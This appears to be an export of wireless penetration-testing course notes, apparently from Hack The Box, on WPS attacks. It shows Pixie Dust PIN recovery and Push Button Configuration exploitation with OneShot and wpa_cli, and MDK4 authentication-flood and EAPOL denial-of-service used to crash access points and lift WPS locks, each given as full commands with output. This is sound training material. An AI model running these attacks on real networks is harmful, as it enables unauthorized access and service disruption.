+[+] Waiting <span class="hljs-keyword">for</span> beacon from <span class="hljs-number">86</span>:<span class="hljs-string">FC:</span><span class="hljs-number">9</span><span class="hljs-string">F:</span><span class="hljs-number">5</span><span class="hljs-string">D:</span><span class="hljs-number">67</span>:<span class="hljs-number">4</span>E
+[+] Received beacon from <span class="hljs-number">86</span>:<span class="hljs-string">FC:</span><span class="hljs-number">9</span><span class="hljs-string">F:</span><span class="hljs-number">5</span><span class="hljs-string">D:</span><span class="hljs-number">67</span>:<span class="hljs-number">4</span>E
+[!] Found packet with bad FCS, skipping...
+[+] Associated with <span class="hljs-number">86</span>:<span class="hljs-string">FC:</span><span class="hljs-number">9</span><span class="hljs-string">F:</span><span class="hljs-number">5</span><span class="hljs-string">D:</span><span class="hljs-number">67</span>:<span class="hljs-number">4</span>E (<span class="hljs-string">ESSID:</span> HackMe)
+[+] WPS <span class="hljs-string">PIN:</span> <span class="hljs-string">'32552273'</span>
+[+] WPA <span class="hljs-string">PSK:</span> <span class="hljs-string">'&lt;SNIP&gt;'</span>
+[+] AP <span class="hljs-string">SSID:</span> <span class="hljs-string">'HackMe'</span>
+</code></pre>
+<hr>
+<h4 id="using-oneshot">Using Oneshot</h4>
+<p>To perform a Pixie Dust attack using <a href="https://github.com/fulvius31/OneShot/tree/master">OneShot</a>, we again require our interface to be in monitor mode. However, before proceeding, we should delete the previously configured <code>mon0</code> interface.</p>
+<p>  The Pixie Dust Attack</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ iw dev mon0 del
+rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ iwconfig
+
+eth0      no wireless extensions.
+
+lo        no wireless extensions.
+
+wlan0     IEEE <span class="hljs-number">802.11</span>  <span class="hljs-string">ESSID:</span>off/any  
+<span class="hljs-symbol">          Mode:</span>Managed  Access <span class="hljs-string">Point:</span> Not-Associated   Tx-Power=<span class="hljs-number">20</span> dBm   
+          Retry <span class="hljs-keyword">short</span> <span class="hljs-string">limit:</span><span class="hljs-number">7</span>   RTS <span class="hljs-string">thr:</span>off   Fragment <span class="hljs-string">thr:</span>off
+          Encryption <span class="hljs-string">key:</span>off
+          Power <span class="hljs-string">Management:</span>on
+</code></pre>
+<p>Now, we can use <code>airmon-ng</code> to set our <code>wlan0</code> interface into monitor mode.</p>
+<p>  The Pixie Dust Attack</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ airmon-ng start wlan0
+
+Found 4 processes that could cause trouble.
+Kill them using 'airmon-ng<span class="hljs-built_in"> check </span>kill' before putting
+the card in<span class="hljs-built_in"> monitor </span>mode, they will interfere by changing channels<span class="hljs-built_in">
+and </span>sometimes putting the interface back in managed mode
+
+    PID Name
+    182 avahi-daemon
+    198 wpa_supplicant
+    213 avahi-daemon
+    220 NetworkManager
+
+PHY    Interface    Driver        Chipset
+
+phy1    wlan0        htb80211_chipset    HTB ChipSet of 802.11 radio(s) for mac80211
+
+        (mac80211<span class="hljs-built_in"> monitor </span>mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
+        (mac80211 station mode vif disabled for [phy1]wlan0)
+</code></pre>
+<p>  The Pixie Dust Attack</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ iwconfig
+
+eth0      no wireless extensions.
+
+lo        no wireless extensions.
+
+wlan0mon  IEEE <span class="hljs-number">802.11</span>  <span class="hljs-string">ESSID:</span>off/any  
+<span class="hljs-symbol">          Mode:</span>Managed  Access <span class="hljs-string">Point:</span> Not-Associated   Tx-Power=<span class="hljs-number">20</span> dBm   
+          Retry <span class="hljs-keyword">short</span> <span class="hljs-string">limit:</span><span class="hljs-number">7</span>   RTS <span class="hljs-string">thr:</span>off   Fragment <span class="hljs-string">thr:</span>off
+          Encryption <span class="hljs-string">key:</span>off
+          Power <span class="hljs-string">Management:</span>on
+</code></pre>
+<p>Similar to Reaver, OneShot also includes the <code>-K</code> (or <code>--pixie-dust</code>) argument. Let's apply this option and initiate the attack.</p>
+<p>  The Pixie Dust Attack</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ python3 /</span>opt<span class="hljs-regexp">/OneShot/</span>oneshot.py -b <span class="hljs-number">86</span>:<span class="hljs-string">FC:</span><span class="hljs-number">9</span><span class="hljs-string">F:</span><span class="hljs-number">5</span><span class="hljs-string">D:</span><span class="hljs-number">67</span>:<span class="hljs-number">4</span>E -i wlan0mon -K
+
+[*] Running wpa_supplicant¦
+[*] Running wpa_supplicant¦
+[*] Trying PIN <span class="hljs-string">'61212947'</span>¦
+[*] Scanning¦
+&lt;SNIP&gt;
+ [*] Seed <span class="hljs-string">N1:</span>  <span class="hljs-number">0xb9d0ec1c</span>
+ [*] Seed <span class="hljs-string">ES1:</span> <span class="hljs-number">0x00000000</span>
+ [*] Seed <span class="hljs-string">ES2:</span> <span class="hljs-number">0x00000000</span>
+ [*] <span class="hljs-string">PSK1:</span>     f83b96cd8204b73edf202c13232907f8
+ [*] <span class="hljs-string">PSK2:</span>     f67582674650eb5e9a84c42b9a078fcd
+ [*] <span class="hljs-string">ES1:</span>      <span class="hljs-number">00000000000000000000000000000000</span>
+ [*] <span class="hljs-string">ES2:</span>      <span class="hljs-number">00000000000000000000000000000000</span>
+ [+] WPS <span class="hljs-string">pin:</span>  <span class="hljs-number">32552273</span>
+
+ [*] Time <span class="hljs-string">taken:</span> <span class="hljs-number">0</span> s <span class="hljs-number">27</span> ms
+</code></pre>
+<p>Based on the output, it is evident that OneShot was successful, recovering the PIN by way of Pixie Dust attack.</p>
+<p>In the next section, we will explore ways to potentially crash a target access point, thereby enabling us to bypass the WPS lock and continue our PIN cracking efforts.</p>
+<hr>
+<h2 id="push-button-configuration">Push Button Configuration</h2>
+<hr>
+<p><code>Push Button Configuration (PBC)</code> is a simple and user-friendly method for connecting devices to a wireless network using Wi-Fi Protected Setup (WPS). It’s particularly useful for users who want to avoid entering complex passwords. PBC is a feature of WPS that allows users to connect devices to a Wi-Fi network by simply pressing a physical button on the router/AP and the connecting device, instead of entering a password.</p>
+<hr>
+<p><strong>How Does PBC Work?</strong></p>
+<ul>
+<li><code>Physical Button Press</code>: Most routers and access points have a WPS button that triggers PBC.</li>
+<li><code>Automatic Pairing</code>: After pressing the button, the router will listen for new device requests to connect for a set time (usually two minutes). During this period, any device that requests access can connect without needing a password.</li>
+<li><code>Device Side Interaction</code>: The connecting device (e.g., smartphone, smart TV, etc.) typically has an option to connect via WPS. After selecting this, the device searches for routers or access points in PBC mode and establishes a connection. The connection is established without the need to enter a password manually.</li>
+</ul>
+<p>For example, as shown in this <a href="https://support.hp.com/in-en/document/ish_4641127-4645964-16">post</a>, Push Button Configuration is commonly used to connect printers and other devices to Wi-Fi networks without requiring a password.</p>
+<hr>
+<h4 id="enumeration">Enumeration</h4>
+<p>We can use <code>airodump-ng</code> to check if the Wi-Fi network is in Push Button Configuration (PBC) mode.</p>
+<p>  Push Button Configuration</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ airodump-ng wlan0mon -c<span class="hljs-number"> 1 </span>--wps
+
+ CH <span class="hljs-number"> 1 </span>][ Elapsed:<span class="hljs-number"> 0 </span>s ][ 2024-08-28 21:29 
+
+ BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH WPS                    ESSID</span>
+
+ D8:D6:3D:EB:29:D5  -47  <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 22 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span> <span class="hljs-number"> 54 </span>  WPA2 CCMP   PSK  2.0 LAB,DISP,PBC,KPAD  HackTheWireless
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ D8:D6:3D:EB:29:D5  F2:B3:16:65:D6:90  -29   <span class="hljs-number"> 0 </span>-<span class="hljs-number"> 1 </span>    <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 1 </span>        HackTheWireless
+</code></pre>
+<p>As shown in the <code>airodump-ng</code> output above, we can see that WPS is operating in Push Button Configuration (PBC) mode, so it is possible to connect to it with the <code>PBC</code> method.</p>
+<hr>
+<h3 id="performing-the-attack">Performing the attack</h3>
+<p>Consider a scenario where we are performing a wireless penetration test and discover an access point with WPS enabled. Since we're onsite at the client's office, we have direct access to the router. In this situation, we can physically press the WPS button on the back of the router, allowing us to connect to the access point without having to manually enter a password. We can achieve this by using tools such as <code>oneshot</code> for automated execution, or manually by utilizing <code>wpa_cli</code> to establish the connection.</p>
+<h4 id="using-wpa-_cli">Using wpa_cli</h4>
+<p>First, we need to scan for available access points to obtain their BSSID. This can be done using the <code>iwlist scan</code> command, as demonstrated below.</p>
+<p>  Push Button Configuration</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ iwlist wlan0 scan |  grep <span class="hljs-string">'Cell\|Quality\|ESSID\|IEEE'</span>
+
+          Cell <span class="hljs-number">01</span> - <span class="hljs-string">Address:</span> <span class="hljs-string">D8:</span><span class="hljs-string">D6:</span><span class="hljs-number">3</span><span class="hljs-string">D:</span><span class="hljs-string">EB:</span><span class="hljs-number">29</span>:D5
+                    Quality=<span class="hljs-number">61</span>/<span class="hljs-number">70</span>  Signal level=<span class="hljs-number">-49</span> dBm  
+<span class="hljs-symbol">                    ESSID:</span><span class="hljs-string">"HackTheWireless"</span>
+<span class="hljs-symbol">                    IE:</span> IEEE <span class="hljs-number">802.11</span>i/WPA2 Version <span class="hljs-number">1</span>
+</code></pre>
+<p>Alternatively, we can achieve the same result with <code>wpa_cli</code>.</p>
+<p>  Push Button Configuration</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ wpa<span class="hljs-emphasis">_cli scan_</span>results
+
+Selected interface 'wlan0'
+bssid / frequency / signal level / flags / ssid
+d8:d6:3d:eb:29:d5    2412    -49    [<span class="hljs-string">WPA2-PSK-CCMP</span>][<span class="hljs-symbol">WPS-PBC</span>][<span class="hljs-string">ESS</span>]    HackTheWireless
+</code></pre>
+<p>Once we have identified our target BSSID, we immediately press the WPS button on the back of the router and execute following command.</p>
+<p>  Push Button Configuration</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ wpa_cli wps_pbc <span class="hljs-string">D8:</span><span class="hljs-string">D6:</span><span class="hljs-number">3</span><span class="hljs-string">D:</span><span class="hljs-string">EB:</span><span class="hljs-number">29</span>:D5
+
+Selected <span class="hljs-class"><span class="hljs-keyword">interface</span> '<span class="hljs-title">wlan0</span>'
+<span class="hljs-title">OK</span></span>
+</code></pre>
+<p>After a few seconds, we can check <code>wpa_supplicant</code> to verify that we've successfully connected to the Wi-Fi network.</p>
+<p>  Push Button Configuration</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ systemctl status wpa_supplicant
+
+● wpa_supplicant.service - WPA supplicant
+<span class="hljs-symbol">     Loaded:</span> loaded (<span class="hljs-regexp">/lib/</span>systemd<span class="hljs-regexp">/system/</span>wpa_supplicant.service; enabled; vendor <span class="hljs-string">preset:</span> enabled)
+    Drop-<span class="hljs-string">In:</span> <span class="hljs-regexp">/run/</span>systemd<span class="hljs-regexp">/system/</span>service.d
+             └─zzz-lxc-service.conf
+<span class="hljs-symbol">     Active:</span> active (running) since Fri <span class="hljs-number">2024</span><span class="hljs-number">-08</span><span class="hljs-number">-16</span> <span class="hljs-number">13</span>:<span class="hljs-number">19</span>:<span class="hljs-number">25</span> UTC; <span class="hljs-number">6</span>h ago
+   Main <span class="hljs-string">PID:</span> <span class="hljs-number">205</span> (wpa_supplicant)
+<span class="hljs-symbol">      Tasks:</span> <span class="hljs-number">1</span> (<span class="hljs-string">limit:</span> <span class="hljs-number">4579</span>)
+<span class="hljs-symbol">     Memory:</span> <span class="hljs-number">7.0</span>M
+<span class="hljs-symbol">     CGroup:</span> <span class="hljs-regexp">/system.slice/</span>wpa_supplicant.service
+             └─<span class="hljs-number">205</span> <span class="hljs-regexp">/sbin/</span>wpa_supplicant -u -s -O <span class="hljs-regexp">/run/</span>wpa_supplicant
+
+Aug <span class="hljs-number">16</span> <span class="hljs-number">19</span>:<span class="hljs-number">55</span>:<span class="hljs-number">25</span> WiFiIntro wpa_supplicant[<span class="hljs-number">205</span>]: <span class="hljs-string">wlan0:</span> WPS-SUCCESS
+Aug <span class="hljs-number">16</span> <span class="hljs-number">19</span>:<span class="hljs-number">55</span>:<span class="hljs-number">25</span> WiFiIntro wpa_supplicant[<span class="hljs-number">205</span>]: <span class="hljs-string">wlan0:</span> CTRL-EVENT-DSCP-POLICY clear_all
+Aug <span class="hljs-number">16</span> <span class="hljs-number">19</span>:<span class="hljs-number">55</span>:<span class="hljs-number">25</span> WiFiIntro wpa_supplicant[<span class="hljs-number">205</span>]: <span class="hljs-string">wlan0:</span> <span class="hljs-string">SME:</span> Trying to authenticate with <span class="hljs-string">d8:</span><span class="hljs-string">d6:</span><span class="hljs-number">3</span><span class="hljs-string">d:</span><span class="hljs-string">eb:</span><span class="hljs-number">29</span>:d5 (SSID=<span class="hljs-string">'HackTheWireless'</span> freq=<span class="hljs-number">2412</span> MHz)
+Aug <span class="hljs-number">16</span> <span class="hljs-number">19</span>:<span class="hljs-number">55</span>:<span class="hljs-number">25</span> WiFiIntro wpa_supplicant[<span class="hljs-number">205</span>]: <span class="hljs-string">wlan0:</span> Trying to associate with <span class="hljs-string">d8:</span><span class="hljs-string">d6:</span><span class="hljs-number">3</span><span class="hljs-string">d:</span><span class="hljs-string">eb:</span><span class="hljs-number">29</span>:d5 (SSID=<span class="hljs-string">'HackTheWireless'</span> freq=<span class="hljs-number">2412</span> MHz)
+Aug <span class="hljs-number">16</span> <span class="hljs-number">19</span>:<span class="hljs-number">55</span>:<span class="hljs-number">25</span> WiFiIntro wpa_supplicant[<span class="hljs-number">205</span>]: <span class="hljs-string">wlan0:</span> Associated with <span class="hljs-string">d8:</span><span class="hljs-string">d6:</span><span class="hljs-number">3</span><span class="hljs-string">d:</span><span class="hljs-string">eb:</span><span class="hljs-number">29</span>:d5
+Aug <span class="hljs-number">16</span> <span class="hljs-number">19</span>:<span class="hljs-number">55</span>:<span class="hljs-number">25</span> WiFiIntro wpa_supplicant[<span class="hljs-number">205</span>]: <span class="hljs-string">wlan0:</span> CTRL-EVENT-SUBNET-STATUS-UPDATE status=<span class="hljs-number">0</span>
+Aug <span class="hljs-number">16</span> <span class="hljs-number">19</span>:<span class="hljs-number">55</span>:<span class="hljs-number">25</span> WiFiIntro wpa_supplicant[<span class="hljs-number">205</span>]: <span class="hljs-string">wlan0:</span> <span class="hljs-string">WPA:</span> Key negotiation completed with <span class="hljs-string">d8:</span><span class="hljs-string">d6:</span><span class="hljs-number">3</span><span class="hljs-string">d:</span><span class="hljs-string">eb:</span><span class="hljs-number">29</span>:d5 [PTK=CCMP GTK=CCMP]
+Aug <span class="hljs-number">16</span> <span class="hljs-number">19</span>:<span class="hljs-number">55</span>:<span class="hljs-number">25</span> WiFiIntro wpa_supplicant[<span class="hljs-number">205</span>]: <span class="hljs-string">wlan0:</span> CTRL-EVENT-CONNECTED - Connection to <span class="hljs-string">d8:</span><span class="hljs-string">d6:</span><span class="hljs-number">3</span><span class="hljs-string">d:</span><span class="hljs-string">eb:</span><span class="hljs-number">29</span>:d5 completed [id=<span class="hljs-number">3</span> id_str=]
+</code></pre>
+<p>We can use <code>dhclient</code> followed by the interface name, such as <code>wlan0</code>, to obtain a valid IP address within the access point's subnet.</p>
+<p>  Push Button Configuration</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">rootlrahmanTamim</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo dhclient wlan0
+</code></pre>
+<p>We can verify the connection, using <code>ifconfig</code> to confirm that we've successfully connected to the access point and received an IP address.</p>
+<p>  Push Button Configuration</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ ifconfig
+
+wlan0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
+        ether 02:00:00:00:01:00  txqueuelen<span class="hljs-number"> 1000 </span> (Ethernet)
+        RX packets<span class="hljs-number"> 43 </span> bytes<span class="hljs-number"> 6665 </span>(6.6 KB)
+        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0
+        TX packets<span class="hljs-number"> 42 </span> bytes<span class="hljs-number"> 7530 </span>(7.5 KB)
+        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0
+</code></pre>
+<h4 id="using-oneshot">Using Oneshot</h4>
+<p>We can also use <a href="https://github.com/fulvius31/OneShot/tree/master">Oneshot</a> to automate the exploitation of PBC. Oneshot will automatically generate the valid WPS PIN and WPA passphrase for the access point.</p>
+<p>To use Oneshot, we first need to enable monitor mode on the <code>wlan0</code> interface by using <code>airmon-ng</code>.</p>
+<p>  Push Button Configuration</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ airmon-ng start wlan0
+
+Found 5 processes that could cause trouble.
+Kill them using 'airmon-ng<span class="hljs-built_in"> check </span>kill' before putting
+the card in<span class="hljs-built_in"> monitor </span>mode, they will interfere by changing channels<span class="hljs-built_in">
+and </span>sometimes putting the interface back in managed mode
+
+    PID Name
+    183 avahi-daemon
+    205 wpa_supplicant
+    215 avahi-daemon
+    225 NetworkManager
+   1215 dhclient
+
+PHY    Interface    Driver        Chipset
+
+phy1    wlan0        htb80211_chipset    HTB ChipSet of 802.11 radio(s) for mac80211
+</code></pre>
+<p>Once monitor mode is enabled, we can run Oneshot with the <code>--pbc</code> argument to connect using PBC mode.</p>
+<p>  Push Button Configuration</p>
+<pre><code class="lang-shell-session"><span class="hljs-symbol">rootlrahmanTamim</span>@htb[/htb]$ python3 /opt/<span class="hljs-symbol">OneShot</span>/oneshot.py -i wlan0mon --pbc
+
+[*] <span class="hljs-symbol">Running</span> wpa_supplicant…
+[*] <span class="hljs-symbol">Starting</span> <span class="hljs-symbol">WPS</span> push button connection…
+[*] <span class="hljs-symbol">Scanning</span>…
+[*] <span class="hljs-symbol">Selected</span> <span class="hljs-symbol">AP</span>: <span class="hljs-symbol">D8</span>:<span class="hljs-symbol">D6</span>:<span class="hljs-number">3</span><span class="hljs-symbol">D</span>:<span class="hljs-symbol">EB</span>:<span class="hljs-number">29</span>:<span class="hljs-symbol">D5</span>
+[*] <span class="hljs-symbol">Authenticating</span>…
+[+] <span class="hljs-symbol">Authenticated</span>
+[*] <span class="hljs-symbol">Associating</span> with <span class="hljs-symbol">AP</span>…
+[+] <span class="hljs-symbol">Associated</span> with <span class="hljs-symbol">D8</span>:<span class="hljs-symbol">D6</span>:<span class="hljs-number">3</span><span class="hljs-symbol">D</span>:<span class="hljs-symbol">EB</span>:<span class="hljs-number">29</span>:<span class="hljs-symbol">D5</span> (<span class="hljs-symbol">ESSID</span>: <span class="hljs-symbol">HackTheWireless</span>)
+[*] <span class="hljs-symbol">Received</span> <span class="hljs-symbol">Identity</span> <span class="hljs-symbol">Request</span>
+[*] <span class="hljs-symbol">Sending</span> <span class="hljs-symbol">Identity</span> <span class="hljs-symbol">Response</span>…
+[*] <span class="hljs-symbol">Sending</span> <span class="hljs-symbol">WPS</span> <span class="hljs-symbol">Message</span> <span class="hljs-symbol">M1</span>…
+[*] <span class="hljs-symbol">Received</span> <span class="hljs-symbol">WPS</span> <span class="hljs-symbol">Message</span> <span class="hljs-symbol">M2</span>
+[*] <span class="hljs-symbol">Sending</span> <span class="hljs-symbol">WPS</span> <span class="hljs-symbol">Message</span> <span class="hljs-symbol">M3</span>…
+[*] <span class="hljs-symbol">Received</span> <span class="hljs-symbol">WPS</span> <span class="hljs-symbol">Message</span> <span class="hljs-symbol">M4</span>
+[*] <span class="hljs-symbol">Sending</span> <span class="hljs-symbol">WPS</span> <span class="hljs-symbol">Message</span> <span class="hljs-symbol">M5</span>…
+[*] <span class="hljs-symbol">Received</span> <span class="hljs-symbol">WPS</span> <span class="hljs-symbol">Message</span> <span class="hljs-symbol">M6</span>
+[*] <span class="hljs-symbol">Sending</span> <span class="hljs-symbol">WPS</span> <span class="hljs-symbol">Message</span> <span class="hljs-symbol">M7</span>…
+[*] <span class="hljs-symbol">Received</span> <span class="hljs-symbol">WPS</span> <span class="hljs-symbol">Message</span> <span class="hljs-symbol">M8</span>
+[+] <span class="hljs-symbol">WPS</span> <span class="hljs-symbol">PIN</span>: <span class="hljs-string">'&lt;PBC mode&gt;'</span>
+[+] <span class="hljs-symbol">WPA</span> <span class="hljs-symbol">PSK</span>: <span class="hljs-string">'&lt;SNIP&gt;'</span>
+[+] <span class="hljs-symbol">AP</span> <span class="hljs-symbol">SSID</span>: <span class="hljs-string">'HackTheWireless'</span>
+</code></pre>
+<p>Oneshot will use the PBC method to connect to the access point and provide us with the WPA PSK for the network. We can then use these credentials to connect to the network.</p>
+<p> In the lab environment, the router's button is pressed every 15 seconds.</p>
+<hr>
+<h3 id="moving-on">Moving On</h3>
+<p>While Push Button Configuration is convenient, it is not without its drawbacks in terms of security. The simplicity of the process can also allow unauthorized users to connect, should they attempt to exploit the brief window during which the router is in listening mode. Users who prioritize security over convenience may want to disable WPS entirely, and instead rely on strong, unique passwords for their wireless networks. In the next section, we will explore how Denial-of-Service (DoS) attacks can be used to unlock certain access points.</p>
+<hr>
+<h2 id="crashing-a-target-ap-with-mdk4">Crashing a Target AP with MDK4</h2>
+<hr>
+<p>During our efforts of retrieving the PIN and WPA-PSK, we are likely to encounter an access point locking at some point. In this section, we will demonstrate how flooding and crashing the AP can be used as a potential bypass.</p>
+<p>There are a few different kinds of WPS locks, one of which is a delay period that occurs after too many incorrect guesses. As we demonstrated in an earlier section, we can bypass this using our advanced command, specifying the sleep period and time between attempts:</p>
+<p>  Crashing a Target AP with MDK4</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ sudo reaver -l <span class="hljs-number">100</span> -r <span class="hljs-number">3</span>:<span class="hljs-number">45</span> -i wlan0mon -b <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-string">XX:</span><span class="hljs-string">XX:</span>XX -c <span class="hljs-number">11</span>
+</code></pre>
+<p>The second kind of WPS lock is one that requires the AP to be reset, either through a power cycle or some other means, after too many incorrect PIN attempts. This can dissuade us as attackers from continuing WPS PIN retrieval techniques. However, <code>Authentication Denial-of-Service</code> and <code>EAPOL Start and Logoff</code> packet injection flooding attacks can grant us this access point reset. In some cases, this will remove the WPS lock. It is worth noting that not all access points are vulnerable to these two aggressive techniques, and <code>these techniques are truly a last resort</code>. In some instances, the access point will crash, while the WPS lock remains enabled.</p>
+<p><strong>Bypassing the WPS Reset Lock through MDK4</strong></p>
+<p>To begin this technique, we will need three terminals. In the first terminal, we will initiate the online bruteforcing attempt against the PIN.</p>
+<p>  Crashing a Target AP with MDK4</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ sudo reaver -l <span class="hljs-number">100</span> -r <span class="hljs-number">3</span>:<span class="hljs-number">45</span> -i wlan0mon -b <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-string">XX:</span><span class="hljs-string">XX:</span>XX -c <span class="hljs-number">11</span>
+</code></pre>
+<p>In the second terminal, we can monitor our <code>WPS Locked</code> status with <code>airodump-ng</code> and the <code>--wps</code> filter. We also specify our BSSID and channel, to exclude any additional access points from our list.</p>
+<p>  Crashing a Target AP with MDK4</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ airodump-ng --wps --bssid 60:38:E0:XX:XX:XX -c<span class="hljs-number"> 11 </span>wlan0mon
+
+CH<span class="hljs-number"> 11 </span>][ Elapsed:<span class="hljs-number"> 0 </span>s ][ 2023-01-02 23:29 
+
+ BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID</span>
+
+ 60:38:E0:XX:XX:XX  -52  <span class="hljs-number"> 0 </span>     <span class="hljs-number"> 14 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span><span class="hljs-number"> 11 </span> <span class="hljs-number"> 65 </span>  WPA2 CCMP   PSK Locked  HTB-Wireless
+</code></pre>
+<p>Suppose our access point displays a locked status. This will halt all PIN attempts occurring in the first terminal. Luckily, <a href="https://github.com/aircrack-ng/mdk4">MDK4</a> includes functionality in its attack modules for both Authentication Denial-of-Service and EAPOL Start and Logoff Packet Injection flooding. In our third terminal, we can employ the following command to test for Authentication Denial-of-Service flooding. We specify attack module <code>a</code> for <code>Authentication Denial-of-Service</code>, and our access point's MAC address with <code>-a</code>.</p>
+<p>  Crashing a Target AP with MDK4</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ sudo mdk4 wlan0mon a -a <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-string">XX:</span><span class="hljs-string">XX:</span>XX
+
+Connecting Client <span class="hljs-string">BC:</span><span class="hljs-string">AC:</span><span class="hljs-string">DC:</span><span class="hljs-number">23</span>:<span class="hljs-string">D1:</span><span class="hljs-number">31</span> to target AP <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-string">XX:</span><span class="hljs-string">XX:</span>XX
+Packets <span class="hljs-string">sent:</span>      <span class="hljs-number">1</span> - <span class="hljs-string">Speed:</span>    <span class="hljs-number">1</span> packets/sec
+Connecting Client <span class="hljs-number">84</span>:<span class="hljs-number">24</span>:<span class="hljs-number">10</span>:<span class="hljs-number">39</span>:<span class="hljs-string">FD:</span>D1 to target AP <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-string">XX:</span><span class="hljs-string">XX:</span>XX
+Packets <span class="hljs-string">sent:</span>   <span class="hljs-number">1618</span> - <span class="hljs-string">Speed:</span> <span class="hljs-number">1617</span> packets/sec
+Connecting Client <span class="hljs-number">8</span><span class="hljs-string">D:</span><span class="hljs-string">D3:</span><span class="hljs-number">44</span>:<span class="hljs-string">A8:</span><span class="hljs-number">23</span>:<span class="hljs-number">6</span>B to target AP <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-string">XX:</span><span class="hljs-string">XX:</span>XX
+</code></pre>
+<p><code>Authentication Denial-Of-Service</code> attacks will continue to spoof MAC addresses to authenticate to the network. This floods the access point's client list, and in many cases causes the access point to crash, thus resetting it. This can enable us to redeem an unlocked WPS status.</p>
+<p>Alternatively, we could attempt this same attack with the <code>Intelligent Test</code> on the access point. The <a href="https://manpages.debian.org/bookworm/mdk4/mdk4.2.en.html#i~2">Intelligent Test</a> connects clients against the AP and reinjects sniffed data to keep them alive.</p>
+<p>  Crashing a Target AP with MDK4</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ sudo mdk4 wlan0mon a -i <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-string">XX:</span><span class="hljs-string">XX:</span>XX
+</code></pre>
+<p>If our access point is still displaying a locked status in our second terminal, we could then attempt an <code>EAPOL Start and Logoff Packet Injection</code> attack.</p>
+<p>In the third terminal, we have our choice of <code>EAPOL Start</code> or <code>EAPOL Logoff</code> messages. To use <code>EAPOL Start</code> messages, we run the following command.</p>
+<p>  Crashing a Target AP with MDK4</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ mdk4 wlan0mon e -t <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-string">XX:</span><span class="hljs-string">XX:</span>XX
+</code></pre>
+<p>To use <code>EAPOL Logoff</code> messages to kick clients off the network, we can employ the command seen below.</p>
+<p>  Crashing a Target AP with MDK4</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim<span class="hljs-meta">@htb</span>[/htb]$ mdk4 wlan0mon e -t <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-string">XX:</span><span class="hljs-string">XX:</span>XX -l
+</code></pre>
+<p>Alternatively, we could leave our <code>EAPOL Start</code> message MDK4 command running in our third terminal and begin the <code>EAPOL Logoff</code> messages in a fourth terminal. We can also utilize a deauthentication attack to kick clients.</p>
+<p>By this point, our target access point should have crashed or reset if it is vulnerable to either of these DOS attacks. We can check on this in our second terminal through the <code>airodump-ng</code> output.</p>
+<p>  Crashing a Target AP with MDK4</p>
+<pre><code class="lang-shell-session">rootlrahmanTamim@htb[/htb]$ airodump-ng --wps --bssid 60:38:E0:XX:XX:XX -c<span class="hljs-number"> 11 </span>wlan0mon
+
+CH<span class="hljs-number"> 11 </span>][ Elapsed:<span class="hljs-number"> 0 </span>s ][ 2023-01-02 23:29 
+
+ BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH WPS    ESSID</span>
+
